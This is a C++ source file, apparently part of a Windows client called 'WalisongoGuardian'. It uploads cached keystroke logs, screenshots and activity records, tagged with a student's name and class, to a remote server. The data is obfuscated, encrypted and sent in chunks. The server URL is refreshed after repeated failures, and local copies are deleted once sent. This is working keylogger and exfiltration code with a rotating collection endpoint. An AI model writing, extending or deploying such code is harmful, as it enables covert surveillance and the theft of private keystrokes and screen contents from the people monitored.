#include "transmission.h"
#include "config.h"
#include "globals.h"
#include "utils.h"
#include "encryption.h"
#include "network_gate.h" 
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <algorithm>
#include <filesystem>
#include <mutex> // Tambahan untuk keamanan thread

// Mutex global khusus untuk melindungi akses ke Config::DYNAMIC_SERVER_URL
static std::mutex g_urlMtx;

/**
 * Parameter overrideUrl: Jika diisi, fungsi akan mengirim data ke URL tersebut.
 * Jika kosong, fungsi akan mengambil dari Config::DYNAMIC_SERVER_URL.
 */
bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::string fname, 
                     std::string fileID, int chunkNum, int chunkTotal, std::string overrideUrl) {

    std::string finalUrl;

    // Proteksi pembacaan URL global dengan mutex
    {
        std::lock_guard<std::mutex> lock(g_urlMtx);
        finalUrl = overrideUrl.empty() ? Config::DYNAMIC_SERVER_URL : overrideUrl;
    }

    if (finalUrl.empty()) {
        #ifdef _DEBUG
        std::cerr << "[ERROR] Server URL kosong!" << std::endl;
        #endif
        return false; 
    }
    
    HINTERNET hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return false;

    URL_COMPONENTSA url = { sizeof(url) };
    char host[256], path[1024];
    url.lpszHostName = host; url.dwHostNameLength = 256;
    url.lpszUrlPath = path; url.dwUrlPathLength = 1024;

    // Menggunakan finalUrl (bisa URL default atau URL khusus heartbeat)
    if (!InternetCrackUrlA(finalUrl.c_str(), 0, 0, &url)) {
        InternetCloseHandle(hInt);
        return false;
    }

    INTERNET_PORT port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : url.nPort;
    if (port == 0) port = 80;
    
    DWORD httpFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
    if (url.nScheme == INTERNET_SCHEME_HTTPS) httpFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hConn = InternetConnectA(hInt, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { 
        InternetCloseHandle(hInt); 
        return false; 
    }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, NULL, httpFlags, 0);
    if (!hReq) { 
        InternetCloseHandle(hConn); 
        InternetCloseHandle(hInt); 
        return false; 
    }

    DWORD timeout = 30000; 
    InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
                          "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n" +
                          "X-ID: " + SYSTEM_ID + "\r\n" +
                          "X-User: " + STUDENT_NAME + " [" + STUDENT_CLASS + "]\r\n" +
                          "X-Type: " + type + "\r\n" +
                          "X-Filename: " + fname + "\r\n" +
                          "X-File-ID: " + fileID + "\r\n" +
                          "X-Chunk-Num: " + std::to_string(chunkNum) + "\r\n" +
                          "X-Chunk-Total: " + std::to_string(chunkTotal) + "\r\n" +
                          "Content-Type: application/octet-stream\r\n" +
                          "Content-Length: " + std::to_string(chunk.size()) + "\r\n";

    BOOL res = HttpSendRequestA(hReq, headers.c_str(), (DWORD)headers.length(), 
                                (LPVOID)chunk.data(), (DWORD)chunk.size());
    
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwSize, NULL);

    #ifdef _DEBUG
    std::cout << "[SEND] URL: " << finalUrl << " | Status: " << dwStatusCode << std::endl;
    #endif

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);
    
    return (res == TRUE && dwStatusCode == 200);
}

void ProcessOfflineQueue() {
    std::vector<std::string> types = {"activity", "keylog", "screenshot"};
    static int failCounter = 0;

    for (auto& t : types) {
        std::filesystem::path p = GetCache(t);
        if (!std::filesystem::exists(p)) continue;

        for (auto& entry : std::filesystem::directory_iterator(p)) {
            std::ifstream f(entry.path(), std::ios::binary);
            if (!f.is_open()) continue;
            
            std::vector<BYTE> buf((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            f.close();

            XORData(buf);
            FinalEncryption(buf);

            std::string fileID = std::to_string(time(NULL)) + "_" + std::to_string(rand() % 10000);
            size_t totalChunks = (buf.size() + Config::CHUNK_SIZE - 1) / Config::CHUNK_SIZE;
            bool successAll = true;

            for (size_t i = 0; i < totalChunks; i++) {
                size_t start = i * Config::CHUNK_SIZE;
                size_t length = std::min(Config::CHUNK_SIZE, buf.size() - start);
                std::vector<BYTE> chunk(buf.begin() + start, buf.begin() + start + length);

                // Menggunakan URL default (Config::DYNAMIC_SERVER_URL)
                if (!PostDataChunked(chunk, t, entry.path().filename().string(), fileID, (int)i, (int)totalChunks)) {
                    failCounter++;
                    if (failCounter >= 3) {
                        // Kunci mutex saat memperbarui link global
                        std::lock_guard<std::mutex> lock(g_urlMtx);
                        RefreshDynamicLink();
                        failCounter = 0;
                    }
                    successAll = false;
                    break; 
                }
                failCounter = 0;
                std::this_thread::sleep_for(std::chrono::milliseconds(200));
            }

            if (successAll) {
                std::error_code ec;
                std::filesystem::remove(entry.path(), ec);
            }
        }
    }
}